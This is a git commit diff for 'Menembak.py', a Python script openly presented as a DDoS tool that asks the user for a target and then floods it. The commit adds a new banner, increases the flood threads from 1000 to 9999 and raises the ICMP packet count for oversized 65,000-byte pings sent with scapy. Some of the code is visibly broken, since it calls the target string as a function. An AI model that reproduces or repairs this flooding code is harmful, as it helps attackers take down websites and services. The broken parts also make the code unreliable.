9c4428f570882e22efdd07f5145112af79b1fdcb
L3M4NG-dotcom <131113625+L3M4NG-dotcom@users.noreply.github.com>
2023-05-08 09:16:50 +0800

    Update Menembak.py

--- Menembak.py
+++ Menembak.py
@@ -1,17 +1,23 @@
-print(" _      ________  ___  ___ _   _ _____                    ")
-print("| |    |____ |  \/  | /   | \ | |  __ \                   ")
-print("| |        / / .  . |/ /| |  \| | |  \/        -*~*-      ")
-print("| |        \ \ |\/| / /_| | . ` | | __         (o o)      ")
-print("| |____.___/ / |  | \___  | |\  | |_\ \    ooO--(_)--Ooo- ")
-print("\_____/\____/\_|  |_/   |_|_| \_/\____/                   ")
-print(" ")    
-print("DDOS tools created by L3M4NG      Used for Good deeds KEKW")                                                          
+print("#################################################################") 
+print("|     __   _____ __  _____ __  _   ________   __________  ____  |") 
+print("|    / /  |__  //  |/  / // / / | / / ____/  /_  __/ __ \/ __ \ |")
+print("|   / /    /_ </ /|_/ / // /_/  |/ / / __     / / / / / / / / / |")
+print("|  / /______/ / /  / /__  __/ /|  / /_/ /    / / / /_/ / /_/ /  |")
+print("| /_____/____/_/  /_/  /_/ /_/ |_/\____/    /_/  \____/_____/   |")
+print("|                                                               |")  
+print("#################################################################")   
+print("")
+print("[DDOS tools created by L3M4NG] | (2023) [Do At Your Own Risk]")
+print("")
+print("")
+print("[-]Tembak Jangan Tak Ditembak!!!")
+print("")
 print("")
 import requests
 import threading
 from scapy.all import *
 
-user_url = input('[<>] Masukkan Mangsa Untuk Ditembak! :')
+user_url = input('[<>] Choose Your Target!!! :')
 stop_processing = False
 
 def send_request():
@@ -23,7 +29,7 @@ def send_request():
         except:
             pass
 
-def send_ping(user_url: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
+def send_ping(user_url: str, number_of_packets_to_send: int = 10, size_of_packet: int = 65000):
     ip = user_url(dst= user_url)
     icmp = user_url()
     raw = Raw(b"X" * size_of_packet)
@@ -32,7 +38,7 @@ def send_ping(user_url: str, number_of_packets_to_send: int = 4, size_of_packet:
     print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + user_url)
 
 threads = []
-for i in range(1000):
+for i in range(9999):
     t = threading.Thread(target=send_request)
     threads.append(t)
     t.start()
@@ -44,4 +50,12 @@ def stop_processing_func():
 stop_processing_func()
 
 # Call the send_ping() function with appropriate arguments
-send_ping(user_url='user_url', number_of_packets_to_send=4, size_of_packet=65000)
+send_ping(user_url=user_url, number_of_packets_to_send=10, size_of_packet=65000)
+
+# Register SIGINT signal handler
+import signal
+signal.signal(signal.SIGINT, lambda sig, frame: stop_processing_func())
+
+# Call the send_ping() function with appropriate arguments
+send_ping(user_url=user_url, number_of_packets_to_send=10, size_of_packet=65000)
+
